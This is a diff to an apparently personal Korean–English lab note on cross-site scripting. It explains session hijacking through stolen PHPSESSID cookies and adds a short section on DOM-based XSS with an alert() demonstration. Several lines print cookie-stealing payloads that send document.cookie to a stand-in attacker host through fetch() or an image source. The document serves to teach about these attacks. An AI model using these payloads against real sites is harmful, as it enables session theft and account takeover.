@@ -156,9 +156,10 @@ or img.src = 'htttp://ww.hacker.com/log.php?data=' + document.cookie);<br>
 —an attacker can exploit the stolen session information to perform session hijacking and gain administrative access.<br>
 
 관리자가 로그인 하면 PHPSESSID가 나오는데, 공격자가 요구한 쿠키값으로 관리자 로그인 증명서와 같습니다.<br>
-공격자가 fetch('htttp://ww.hacker.com/steal?cookie=' + document.cookie); 또는,<br>
+공격자는<br>
+fetch('htttp://ww.hacker.com/steal?cookie=' + document.cookie); 또는,<br>
 img.src = "htttp//ww.hacker.com/log.php?data=" + document.cookie); 처럼,<br>
-공격자는 공격자의 서버로 보내는 스크립트를 구성해 관리자로 로그인하는 세션 하이재킹을 악용할 수 있습니다.
+공격자의 서버로 보내는 스크립트를 구성해 관리자로 로그인하는 세션 하이재킹을 악용할 수 있습니다.
 <br>
 <br>
 <br>
@@ -172,11 +173,17 @@ img.src = "htttp//ww.hacker.com/log.php?data=" + document.cookie); 처럼,<br>
 <br>
 <br>
 <br>
+DOM-Based XSS is an attack that is completed entirely at the browser (client-side) level without passing through the server.<br>
+DOM-Based XSS는 서버를 거치지 않고 브라우저(클라이언트) 단계에서만 공격이 완성됩니다.
+<br>
+<br>
+<br>
+<br>
+<br>
 
 ![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/20.png)<br>
-
-DOM-Based XSS는 서버를 거치지 않고 브라우저(클라이언트) 단계에서만 공격이 완성됩니다.
-
+The Web Tester is displayed as intended by the website.<br>
+사이트의 의도대로 Web Tester가 보입니다.
 <br>
 <br>
 <br>
@@ -186,13 +193,26 @@ DOM-Based XSS는 서버를 거치지 않고 브라우저(클라이언트) 단계
 
 ![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/21.png)<br>
 
+By appending <script>alert("XSS")</script> at this point, the intended script is executed.<br>
+DOM-Based XSS completes the attack entirely at the client side by manipulating the page through developer tools (F12), without any server-side involvement.<br>
+
+여기서 <script>alert("XSS")</script>를 붙이면 의도한 스크립트가 나타납니다.<br>
+DOM-Based XSS는 이렇게 개발자 코드(F12)를 이용해 클라이언트 단계에서만 공격을 완성합니다. 
 <br>
 <br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+* Sanitization & Encoding<br>
 <br>
 <br>
 <br>
 
-<br>![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/22.png)<br>
+![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/.22.png)<br>
 
 <br>
 <br>
